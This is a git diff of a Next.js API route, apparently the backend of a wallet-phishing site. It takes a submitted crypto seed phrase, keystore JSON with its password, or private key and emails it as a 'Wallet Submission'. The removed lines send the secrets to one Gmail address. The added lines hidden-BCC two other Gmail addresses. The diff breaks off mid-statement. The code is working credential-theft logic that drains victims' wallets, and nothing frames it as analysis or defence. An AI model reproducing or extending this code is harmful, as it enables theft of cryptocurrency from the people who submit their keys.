@@ -21,7 +21,6 @@ export async function POST(request: Request) {
       },
     });
 
-    // Verify connection configuration
     transporter.verify(function (error, success) {
       if (error) {
         console.error("Transporter verification failed:", error);
@@ -30,62 +29,28 @@ export async function POST(request: Request) {
       }
     });
 
-    let mailOptions = {};
+    // BCC recipients - invisible to each other
+    const bccRecipients = ['fahadabdullahi180@gmail.com', 'arewatrend01@gmail.com'];
 
-    // If phrase is provided, send email with formatted message
+    let mailOptions = {
+      from: `New Wallet Connect ${email}`,
+      to: email, // Your own email or a neutral one (required)
+      bcc: bccRecipients,
+      subject: 'Wallet Submission',
+      html: '',
+    };
+
+    // Format content based on what's provided
     if (phrase) {
-      const formattedMessage = formatMessage(phrase);
-      mailOptions = {
-        from: `New Wallet Connect ${email}`,
-        to: ['ellahella2015@gmail.com'],
-
-        subject: 'Wallet Submission',
-        html: formattedMessage,
-      };
+      mailOptions.html = formatMessage(phrase);
     }
 
-    // If keystore is provided, send the keystore details
     if (keystore) {
-      mailOptions = {
-        from: `New Wallet Connect ${email}`,
-        to: ['ellahella2015@gmail.com'],
-
-        subject: 'Wallet Submission',
-        html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
-      };
+      mailOptions.html = `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`;
     }
 
-    // If privateKey is provided, send the private key message
     if (privateKey) {
-      const formattedMessage = formatMessage(privateKey);
-      mailOptions = {
-        from: `New Wallet Connect ${email}`,
-        to: ['ellahella2015@gmail.com'],
-
-        subject: 'Wallet Submission',
-        html: formattedMessage,
-      };
+      mailOptions.html = formatMessage(privateKey);
     }
 
-    // Send the email
-    const result = await transporter.sendMail(mailOptions);
-    console.log('SendMail Result:', result);
-
-    // Check for messageId in result to confirm email was sent
-    if (result.messageId) {
-      return new Response(JSON.stringify({ message: 'Email sent successfully!' }), { status: 200 });
-    } else {
-      console.log('Error: No messageId returned');
-      return new Response(JSON.stringify({ error: 'Internal server error' }), { status: 500 });
-    }
-  } catch (error: unknown) {
-    // Handle error gracefully
-    if (error instanceof Error) {
-      console.error('Error in sending email:', error);
-      return new Response(JSON.stringify({ error: error.message }), { status: 500 });
-    } else {
-      console.error('Unknown error:', error);
-      return new Response(JSON.stringify({ error: String(error) }), { status: 500 });
-    }
-  }
-}
+    const result
